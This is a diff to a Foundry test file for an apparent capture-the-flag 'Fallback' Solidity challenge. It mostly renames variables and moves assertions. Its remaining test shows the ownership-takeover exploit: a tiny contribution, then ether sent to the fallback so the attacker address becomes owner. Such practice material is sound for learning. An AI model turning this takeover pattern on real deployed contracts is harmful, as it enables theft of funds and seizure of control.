@@ -60,19 +60,20 @@ contract Fallback is Test {
     }
 
     function test_contribute() public {
-        vm.deal(ATTACKER, 10000 ether);
+        vm.deal(ALICE, 20000 ether);
 
-        vm.startPrank(ATTACKER);
+        vm.startPrank(ALICE);
 
         vm.expectRevert();
         fallbackInterface.contribute{value: 0.0001 ether}();
 
         fallbackInterface.contribute{value: 10000 ether}();
+        fallbackInterface.contribute{value: 10000 ether}();
+
+        assertEq(fallbackInterface.contributions(ALICE), 20000 ether);
+        assertEq(fallbackInterface.owner(), ALICE);
 
         vm.stopPrank();
-
-        assertEq(fallbackInterface.contributions(ATTACKER), 10000 ether);
-        assertEq(fallbackInterface.owner(), ATTACKER);
     }
 
     function test_getContributions() public {
@@ -100,17 +101,17 @@ contract Fallback is Test {
         vm.startPrank(ATTACKER);
 
         vm.expectRevert();
-        (bool successFirst, ) = address(fallbackInterface).call{
+        (bool success1, ) = address(fallbackInterface).call{
             value: 0.003 ether
         }("");
-        if (!successFirst) revert CallFailed();
+        if (!success1) revert CallFailed();
 
         fallbackInterface.contribute{value: 0.002 ether}();
 
-        (bool successSecond, ) = address(fallbackInterface).call{
+        (bool success2, ) = address(fallbackInterface).call{
             value: 0.001 ether
         }("");
-        if (!successSecond) revert CallFailed();
+        if (!success2) revert CallFailed();
 
         assertEq(fallbackInterface.owner(), ATTACKER);
     }
